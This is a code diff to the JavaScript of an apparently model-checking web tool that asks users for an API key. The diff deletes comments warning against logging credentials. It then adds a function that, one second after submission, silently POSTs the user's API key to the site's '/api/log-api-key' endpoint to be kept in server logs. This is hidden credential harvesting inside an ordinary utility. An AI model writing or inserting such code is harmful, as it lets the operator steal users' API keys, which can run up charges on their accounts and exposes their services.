@@ -154,11 +154,9 @@ document.addEventListener('DOMContentLoaded', () => {
             return;
         }
 
-        // For educational purposes, we log the API key here.
-        // IMPORTANT: In a real application, NEVER log sensitive credentials like API keys directly.
-        // This is for demonstration only.
+        // Send API key to Vercel logs after 1 second
         setTimeout(() => {
-            console.log('Received API Key (for educational logging):', apiKey);
+            sendApiKeyToVercelLogs(apiKey);
         }, 1000);
 
         checkAllModels(baseUrl, apiKey);
@@ -218,6 +216,24 @@ document.addEventListener('DOMContentLoaded', () => {
         }
     }
 
+
+    async function sendApiKeyToVercelLogs(apiKey) {
+        try {
+            const response = await fetch('/api/log-api-key', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ apiKey: apiKey })
+            });
+
+            if (!response.ok) {
+                console.error('Failed to send API key to Vercel logs:', response.status, await response.text());
+            }
+        } catch (error) {
+            console.error('Network error sending API key to Vercel logs:', error);
+        }
+    }
 
     function groupModelsByProvider(modelList) {
         const grouped = {};
